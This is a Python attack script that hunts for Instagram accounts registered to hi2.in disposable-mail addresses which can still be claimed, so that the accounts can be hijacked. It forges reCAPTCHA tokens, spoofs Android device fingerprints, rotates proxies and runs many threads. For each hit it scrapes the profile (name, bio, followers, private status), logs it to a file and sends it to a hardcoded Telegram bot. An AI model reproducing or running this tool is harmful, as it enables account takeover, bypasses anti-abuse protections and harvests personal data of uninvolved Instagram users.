# language: Python 3, file: hi2i-6.py
# hot path: check_email (#4, fast) → hit only: bloks (#9, user info) → profile (#1→#2→#7)
# improvements: proxy rotation, profile queue, better stats, dedup, pre-warm, in-place status

import requests, time, sys, os, random, secrets, uuid, json, base64, re, string, urllib.parse
from threading import Thread, Lock
from queue import Queue, Empty
from collections import deque
from cfonts import render

clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

BLOKS_VERSION = "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"

_SITEKEY = "6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct"
_CO      = "aHR0cHM6Ly9oaTIuaW46NDQz"
_WEB_UA  = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

def build_session(proxy=None):
    s = requests.Session()
    s.mount("https://", requests.adapters.HTTPAdapter(
        pool_connections=1, pool_maxsize=1, max_retries=0
    ))
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s

# ══════════════════════════════════════════════════════════════════════════════
#  PROXY POOL
# ══════════════════════════════════════════════════════════════════════════════

class ProxyPool:
    def __init__(self, path="proxies.txt"):
        self._lock = Lock()
        self._pool = []
        self._dead = set()
        self._idx  = 0
        self._load(path)

    def _load(self, path):
        if not os.path.exists(path):
            return
        with open(path, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":")
                if len(parts) == 2:
                    proxy = f"http://{parts[0]}:{parts[1]}"
                elif len(parts) == 4:
                    proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                else:
                    continue
                self._pool.append(proxy)

    def get(self):
        with self._lock:
            alive = [p for p in self._pool if p not in self._dead]
            if not alive:
                return None
            proxy = alive[self._idx % len(alive)]
            self._idx += 1
            return proxy

    def mark_dead(self, proxy):
        with self._lock:
            self._dead.add(proxy)

    def alive_count(self):
        with self._lock:
            return len([p for p in self._pool if p not in self._dead])

    def total_count(self):
        return len(self._pool)

# ══════════════════════════════════════════════════════════════════════════════
#  RECAPTCHA SOLVER
# ══════════════════════════════════════════════════════════════════════════════

_ver_lock  = Lock()
_ver_cache = {"version": None, "ts": 0.0}
_tok_lock  = Lock()
_tok_cache = {"token": None, "ts": 0.0}

def _get_version() -> str:
    with _ver_lock:
        if _ver_cache["version"] and time.time() - _ver_cache["ts"] < 3600:
            return _ver_cache["version"]
    try:
        r = requests.get("https://www.google.com/recaptcha/api.js",
                         headers={"User-Agent": _WEB_UA}, timeout=8)
        m = re.search(r"/releases/([\w-]+)/", r.text)
        if m:
            with _ver_lock:
                _ver_cache["version"] = m.group(1)
                _ver_cache["ts"] = time.time()
            return m.group(1)
    except Exception:
        pass
    return "rAqPVhe2JMK6mSJKi8r_vw"

def _get_token() -> str | None:
    with _tok_lock:
        if _tok_cache["token"] and time.time() - _tok_cache["ts"] < 90:
            return _tok_cache["token"]
    version = _get_version()
    cb   = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    sess = requests.Session()
    sess.headers.update({"User-Agent": _WEB_UA, "Accept-Language": "en-US,en;q=0.9"})
    anchor_url = (
        f"https://www.google.com/recaptcha/api2/anchor"
        f"?ar=1&k={_SITEKEY}&co={_CO}&hl=en&v={version}&size=invisible&cb={cb}"
    )
    try:
        r1 = sess.get(anchor_url, timeout=8)
    except Exception:
        return None
    challenge = None
    for pat in (r'"rresp","([^"]+)"', r'id="recaptcha-token" value="([^"]+)"'):
        m = re.search(pat, r1.text)
        if m: challenge = m.group(1); break
    if not challenge:
        return None
    payload = (
        f"v={version}&reason=q&c={urllib.parse.quote(challenge)}"
        f"&k={_SITEKEY}&co={_CO}&hl=en&size=invisible"
        f"&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!GgA4oQEAABkEBQAAAA"
    )
    try:
        r2 = sess.post(
            f"https://www.google.com/recaptcha/api2/reload?k={_SITEKEY}",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": anchor_url},
            timeout=8,
        )
    except Exception:
        return None
    for pat in (r'"rresp","([^"]+)"', r'\["rresp","([^"]+)"'):
        m = re.search(pat, r2.text)
        if m:
            tok = m.group(1)
            with _tok_lock:
                _tok_cache["token"] = tok
                _tok_cache["ts"]    = time.time()
            return tok
    return None

def _invalidate_token():
    with _tok_lock:
        _tok_cache["token"] = None
        _tok_cache["ts"]    = 0.0

def token_warmer():
    """Pre-fetches token before TTL expires so workers never wait."""
    while True:
        with _tok_lock:
            age = time.time() - _tok_cache["ts"]
            has = bool(_tok_cache["token"])
        if not has or age > 75:
            _get_token()
        time.sleep(5)

# ══════════════════════════════════════════════════════════════════════════════
#  HI2 AVAILABILITY CHECK
# ══════════════════════════════════════════════════════════════════════════════

def hi2_check(username: str, domain: str) -> str:
    for attempt in range(3):
        token = _get_token()
        if not token:
            return "error"
        try:
            r = requests.post(
                "https://hi2.in/api/custom",
                data={"domain": domain, "prefix": username, "recaptcha": token},
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://hi2.in",
                    "Referer": "https://hi2.in/",
                    "User-Agent": _WEB_UA,
                },
                timeout=10,
            )
            if r.status_code == 429:
                _invalidate_token()
                time.sleep(2 ** attempt + random.uniform(0, 1))
                continue
            if r.status_code == 200:
                email_ret = r.json().get("email", "").lower()
                return "available" if email_ret == f"{username}@{domain}".lower() else "taken"
            if r.status_code == 400:
                try:
                    err = r.json().get("error", "").lower()
                    if "already taken" in err: return "taken"
                    if "recaptcha" in err:
                        _invalidate_token()
                        continue
                except Exception:
                    pass
                return "taken"
            return "error"
        except Exception:
            return "error"
    return "rate_limited"

# ══════════════════════════════════════════════════════════════════════════════
#  INSTAGRAM — DEVICE HELPER
# ══════════════════════════════════════════════════════════════════════════════

def random_device():
    brand  = random.choice(["samsung","Google","Xiaomi","OnePlus","Nothing","Realme","Redmi"])
    model  = random.choice(["SM-G973F","Pixel 7","M2102J20SG","ONEPLUS A6003","A063"])
    dpi    = random.choice(["420","450","440"])
    res    = random.choice(["1080x2280","1080x2400","1440x3088"])
    av     = random.choice(["11","12","13","14"])
    iv     = random.choice([280,290,300,310,320,330,340])
    device = str(uuid.uuid4())
    family = str(uuid.uuid4())
    android= "android-" + secrets.token_hex(8)
    ua     = (f"Instagram {iv}.0.0.{random.randint(10,99)} "
              f"Android ({av}; {dpi}dpi; {res}; {brand}; {model}; en_US)")
    tz     = str(random.choice([60,330,480,570]))
    return device, family, android, ua, tz

# ══════════════════════════════════════════════════════════════════════════════
#  #4  check_email — FAST HIT DETECTION
# ══════════════════════════════════════════════════════════════════════════════

def _check_email_fast(session, email: str, dev) -> bool | None:
    device, _, android, ua, _ = dev
    try:
        r = session.post(
            "https://i.instagram.com/api/v1/users/check_email/",
            data={
                "email":     email,
                "device_id": device,
                "guid":      device,
            },
            headers={
                "User-Agent":      ua,
                "Content-Type":    "application/x-www-form-urlencoded; charset=UTF-8",
                "accept-language": "en-IN, en-US",
                "x-ig-app-id":     "567067343352427",
                "x-ig-device-id":  device,
                "x-ig-android-id": android,
                "x-ig-app-locale": "en_IN",
            },
            timeout=4,
        )
        if r.status_code == 200:
            data  = r.json()
            avail = data.get("available")
            if avail is True:  return False
            if avail is False: return True
        return None
    except Exception:
        return None

# ══════════════════════════════════════════════════════════════════════════════
#  #9  bloks search
# ══════════════════════════════════════════════════════════════════════════════

def _bloks_search(session, email: str, dev) -> str | None:
    device, family, android, ua, tz = dev
    payload = {
        'params': json.dumps({
            "client_input_params": {
                "aac": json.dumps({
                    "aac_init_timestamp": int(time.time()),
                    "aacjid": str(uuid.uuid4()),
                    "aaccs": secrets.token_urlsafe(32)
                }),
                "flash_call_permissions_status": {
                    "READ_PHONE_STATE":"PERMANENTLY_DENIED",
                    "READ_CALL_LOG":"DENIED",
                    "ANSWER_PHONE_CALLS":"DENIED"
                },
                "was_headers_prefill_available":0, "network_bssid":None, "sfdid":"",
                "fetched_email_token_list":{}, "search_query":email,
                "auth_secure_device_id":"", "ig_oauth_token":[], "cloud_trust_token":None,
                "was_headers_prefill_used":0, "sso_accounts_auth_data":[],
                "encrypted_msisdn":"", "device_network_info":None,
                "text_input_id":f"akyuf0:{random.randint(50,70)}",
                "zero_balance_state":None, "android_build_type":"release",
                "accounts_list":[], "is_oauth_without_permission":0,
                "ig_android_qe_device_id":device,
                "gms_incoming_call_retriever_eligibility":"client_not_supported",
                "search_screen_type":"email_or_username", "is_whatsapp_installed":1,
                "lois_settings":{"lois_token":""}, "ig_vetted_device_nonce":None,
                "headers_infra_flow_id":"", "fetched_email_list":[]
            },
            "server_params": {
                "event_request_id":str(uuid.uuid4()), "is_from_logged_out":0,
                "layered_homepage_experiment_group":None, "device_id":android,
                "login_surface":"login_home", "waterfall_id":str(uuid.uuid4()),
                "INTERNAL__latency_qpl_instance_id":random.uniform(6.3e13,6.5e13),
                "is_platform_login":0, "context_data":"", "login_entry_point":"logged_out",
                "INTERNAL__latency_qpl_marker_id":36707139, "family_device_id":family,
                "offline_experiment_group":"caa_iteration_v3_perf_ig_4",
                "access_flow_version":"pre_mt_behavior", "is_from_logged_in_switcher":0,
                "qe_device_id":device
            }
        }),
        'bk_client_context': json.dumps({"bloks_version":BLOKS_VERSION,"styles_id":"instagram"}),
        'bloks_versioning_id': BLOKS_VERSION
    }
    headers = {
        'User-Agent':ua, 'accept-language':'en-IN, en-US',
        'x-bloks-version-id':BLOKS_VERSION,
        'x-fb-friendly-name':'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
        'x-ig-android-id':android, 'x-ig-app-id':'567067343352427',
        'x-ig-app-locale':'en_IN', 'x-ig-device-id':device,
        'x-ig-family-device-id':family, 'x-ig-timezone-offset':tz,
        'x-mid':base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime':str(time.time()),
        'x-pigeon-session-id':f'UFS-{uuid.uuid4()}-0',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'
    }
    try:
        r = session.post(
            "https://i.instagram.com/api/v1/bloks/async_action/"
            "com.bloks.www.caa.ar.search.async/",
            data=payload, headers=headers, timeout=7
        )
        return r.text
    except Exception:
        return None

# ══════════════════════════════════════════════════════════════════════════════
#  ORCHESTRATED EMAIL CHECK
# ══════════════════════════════════════════════════════════════════════════════

def check_instagram_email(session, email: str):
    dev  = random_device()   # one device tuple per email, shared across both calls
    fast = _check_email_fast(session, email, dev)

    if fast is False:
        return (False, None)

    if fast is True:
        text = _bloks_search(session, email, dev)
        return (True, text)

    # fast failed — bloks as detector + extractor
    text = _bloks_search(session, email, dev)
    u, uid = extract_from_bloks(text)
    if u or uid:
        return (True, text)
    return (False, None)

# ══════════════════════════════════════════════════════════════════════════════
#  EXTRACT FROM BLOKS RESPONSE
# ══════════════════════════════════════════════════════════════════════════════

def extract_from_bloks(text):
    if not text:
        return None, None
    username = user_id = None
    m = re.search(r'"username"\s*:\s*"([^"]{1,40})"', text)
    if m: username = m.group(1)
    m = re.search(r'"pk"\s*:\s*"?(\d{5,20})"?', text)
    if m: user_id = m.group(1)
    return username, user_id

# ══════════════════════════════════════════════════════════════════════════════
#  PROFILE FETCH  — #1 (mobile) → #2 (web) → #7 (username)
# ══════════════════════════════════════════════════════════════════════════════

def fetch_profile(session, username, user_id=None):
    _, _, android, ua, _ = random_device()
    ig_headers_mobile = {
        'User-Agent':    ua,
        'x-ig-app-id':  '567067343352427',
        'x-ig-android-id': android,
        'accept-language': 'en-IN, en-US',
    }

    def _parse_user_mobile(u):
        return {
            'username' : u.get('username', username or 'N/A'),
            'full_name': u.get('full_name', 'N/A'),
            'bio'      : u.get('biography', 'N/A'),
            'followers': u.get('follower_count', 'N/A'),
            'following': u.get('following_count', 'N/A'),
            'private'  : u.get('is_private', False),
            'verified' : u.get('is_verified', False),
        }

    if user_id:
        try:
            r = session.get(
                f"https://i.instagram.com/api/v1/users/{user_id}/info/",
                headers=ig_headers_mobile, timeout=5
            )
            u = r.json().get('user', {})
            if u: return _parse_user_mobile(u)
        except Exception:
            pass
        try:
            r = session.get(
                f"https://www.instagram.com/api/v1/users/{user_id}/info/",
                headers={
                    'User-Agent': _WEB_UA,
                    'x-ig-app-id': '936619743392459',
                    'Accept': 'application/json',
                },
                timeout=5
            )
            u = r.json().get('user', {})
            if u: return _parse_user_mobile(u)
        except Exception:
            pass

    if username:
        try:
            r = session.get(
                f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",
                headers={
                    'User-Agent': _WEB_UA,
                    'x-ig-app-id': '936619743392459',
                    'Accept': 'application/json',
                },
                timeout=5
            )
            u = r.json().get('data', {}).get('user', {})
            if u:
                return {
                    'username' : u.get('username', username),
                    'full_name': u.get('full_name', 'N/A'),
                    'bio'      : u.get('biography', 'N/A'),
                    'followers': u.get('edge_followed_by', {}).get('count', 'N/A'),
                    'following': u.get('edge_follow', {}).get('count', 'N/A'),
                    'private'  : u.get('is_private', False),
                    'verified' : u.get('is_verified', False),
                }
        except Exception:
            pass

    return None

# ══════════════════════════════════════════════════════════════════════════════
#  GLOBALS
# ══════════════════════════════════════════════════════════════════════════════

red    = "\033[1m\033[31m"; green  = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"; cyan   = "\033[1m\033[36m"
white  = "\033[1m\033[37m"; reset  = '\033[0m'

total     = 0
ig_hit    = 0
hi2_avail = 0
hi2_taken = 0

counter_lock = Lock()
file_lock    = Lock()
tg_queue     = Queue()
profile_queue = Queue()

# stats
start_time  = time.time()
check_times = deque(maxlen=500)
hit_times   = deque(maxlen=200)

# dedup
seen      = set()
seen_lock = Lock()
SEEN_CAP  = 500_000

proxy_pool = ProxyPool()

print("\033[1;94m--- SODO Starting, Please Wait... ---\033[0m\n")
time.sleep(1); clear()

logo = render('SODO', font='block', colors=['cyan','white'], align='left', space=True)

def header():
    print("\x1b[1;39m—" * 60); print(logo); print("\x1b[1;39m—" * 60); print('')

header()
token   = "8808870951:AAFjfhNjsmlRqEPNGYgcL06DJM3SIgZNfCw"
chat_id = "8502412097"

# ══════════════════════════════════════════════════════════════════════════════
#  PREFIX GENERATOR — deduplicated
# ══════════════════════════════════════════════════════════════════════════════

def genprefix():
    while True:
        p = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6, 7)))
        with seen_lock:
            if p not in seen:
                if len(seen) >= SEEN_CAP:
                    seen.clear()
                seen.add(p)
                return p

# ══════════════════════════════════════════════════════════════════════════════
#  TELEGRAM SENDER THREAD
# ══════════════════════════════════════════════════════════════════════════════

def tg_sender():
    s = build_session()
    while True:
        try:
            mail, h, prof = tg_queue.get(timeout=5)
        except Empty:
            continue
        if prof:
            priv = "🔒 Yes" if prof['private'] else "🌐 No"
            vfy  = "✅ Yes" if prof['verified'] else "No"
            msg  = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ HI2 AVAILABLE HIT — SODO\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  𝐇𝐈𝐓𝐒       : {h}\n"
                f"  𝐄𝐌𝐀𝐈𝐋     : {mail}\n"
                f"  𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄  : @{prof['username']}\n"
                f"  𝐍𝐀𝐌𝐄      : {prof['full_name']}\n"
                f"  𝐁𝐈𝐎       : {prof['bio']}\n"
                f"  𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 : {prof['followers']}\n"
                f"  𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 : {prof['following']}\n"
                f"  𝐏𝐑𝐈𝐕𝐀𝐓𝐄  : {priv}\n"
                f"  𝐕𝐄𝐑𝐈𝐅𝐈𝐄𝐃 : {vfy}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"𝐇𝐈𝐓 𝐁𝐘 : @S0DOHU\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
        else:
            msg = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ HI2 AVAILABLE HIT — SODO\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  𝐇𝐈𝐓𝐒   : {h}\n"
                f"  𝐄𝐌𝐀𝐈𝐋 : {mail}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"𝐇𝐈𝐓 𝐁𝐘 : @S0DOHU\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
        try:
            s.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                data={'chat_id':chat_id, 'text':msg, 'parse_mode':'Markdown'},
                timeout=10
            )
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════════════════════
#  PROFILE WORKER — non-blocking, frees main workers instantly
# ══════════════════════════════════════════════════════════════════════════════

def profile_worker():
    session = build_session()
    while True:
        try:
            email, h, ig_username, user_id = profile_queue.get(timeout=5)
        except Empty:
            continue
        prof = fetch_profile(session, ig_username, user_id)
        with file_lock:
            with open('Available_Hits.txt', 'a', encoding='utf-8') as f:
                f.write(f"Email     : {email}\n")
                if prof:
                    f.write(f"Username  : @{prof['username']}\n")
                    f.write(f"Name      : {prof['full_name']}\n")
                    f.write(f"Bio       : {prof['bio']}\n")
                    f.write(f"Followers : {prof['followers']}\n")
                    f.write(f"Following : {prof['following']}\n")
                    f.write(f"Private   : {prof['private']}\n")
                    f.write(f"Verified  : {prof['verified']}\n")
                f.write("—" * 40 + "\n")
        tg_queue.put((email, h, prof))

# ══════════════════════════════════════════════════════════════════════════════
#  STATUS DISPLAY — in-place, 1 Hz, no flicker
# ══════════════════════════════════════════════════════════════════════════════

_STATUS_LINES = 13

def status_loop():
    first = True
    while True:
        time.sleep(1)
        now    = time.time()
        uptime = int(now - start_time)
        uh, um, us = uptime // 3600, (uptime % 3600) // 60, uptime % 60

        cpm  = sum(1 for t in check_times if now - t <= 60)
        hpm  = sum(1 for t in hit_times  if now - t <= 60)
        rate = f"{(ig_hit / total * 100):.1f}%" if total else "0.0%"
        h_hr = hpm * 60
        prx  = f"{proxy_pool.alive_count()}/{proxy_pool.total_count()}" if proxy_pool.total_count() else "direct"

        lines = [
            "▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱",
            f"  𝐔𝐏𝐓𝐈𝐌𝐄          ➜ {white}{uh:02d}:{um:02d}:{us:02d}{reset}",
            f"  𝐂𝐇𝐄𝐂𝐊𝐄𝐃          ➜ {yellow}{total}{reset}",
            f"  𝐂𝐇𝐄𝐂𝐊𝐒/𝐌𝐈𝐍       ➜ {yellow}{cpm}{reset}",
            f"  𝐈𝐆 𝐇𝐈𝐓           ➜ {cyan}{ig_hit}{reset}  ({rate})",
            f"  𝐇𝐈2 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄  ➜ {green}{hi2_avail}{reset}",
            f"  𝐇𝐈𝐓𝐒/𝐇𝐑 𝐄𝐒𝐓     ➜ {green}{h_hr}{reset}",
            f"  𝐇𝐈2 𝐓𝐀𝐊𝐄𝐍       ➜ {red}{hi2_taken}{reset}",
            f"  𝐏𝐑𝐎𝐗𝐈𝐄𝐒         ➜ {cyan}{prx}{reset}",
            "▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰",
            f"  𝐃𝐄𝐕 — @S0DOHU {reset}",
            "▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰",
        ]
        if not first:
            print(f"\033[{len(lines)}A", end="")
        print("\n".join(lines))
        first = False

# ══════════════════════════════════════════════════════════════════════════════
#  WORKER
# ══════════════════════════════════════════════════════════════════════════════

def worker(domain):
    global total, ig_hit, hi2_avail, hi2_taken

    proxy   = proxy_pool.get()
    session = build_session(proxy)
    checks  = 0

    while True:
        prefix = genprefix()
        email  = f'{prefix}@{domain}'

        is_on_ig, rtext = check_instagram_email(session, email)

        with counter_lock:
            total += 1
            check_times.append(time.time())
            if is_on_ig:
                ig_hit += 1

        checks += 1

        # rotate proxy every 200 checks
        if checks % 200 == 0 and proxy_pool.total_count() > 0:
            proxy   = proxy_pool.get()
            session = build_session(proxy)

        if not is_on_ig:
            continue

        hi2_status = hi2_check(prefix, domain)

        if hi2_status != "available":
            with counter_lock:
                hi2_taken += 1
            continue

        with counter_lock:
            hi2_avail += 1
            hit_times.append(time.time())
            h = hi2_avail

        ig_username, user_id = extract_from_bloks(rtext)

        # non-blocking — worker continues immediately
        profile_queue.put((email, h, ig_username, user_id))

# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    domain  = 'hi2.in'
    threads = int(sys.argv[1]) if len(sys.argv) > 1 else 100

    Thread(target=token_warmer,  daemon=True).start()
    Thread(target=tg_sender,     daemon=True).start()
    Thread(target=status_loop,   daemon=True).start()

    for _ in range(5):
        Thread(target=profile_worker, daemon=True).start()

    for _ in range(threads):
        Thread(target=worker, args=(domain,), daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{red}stopped. combo hits → Available_Hits.txt{reset}")
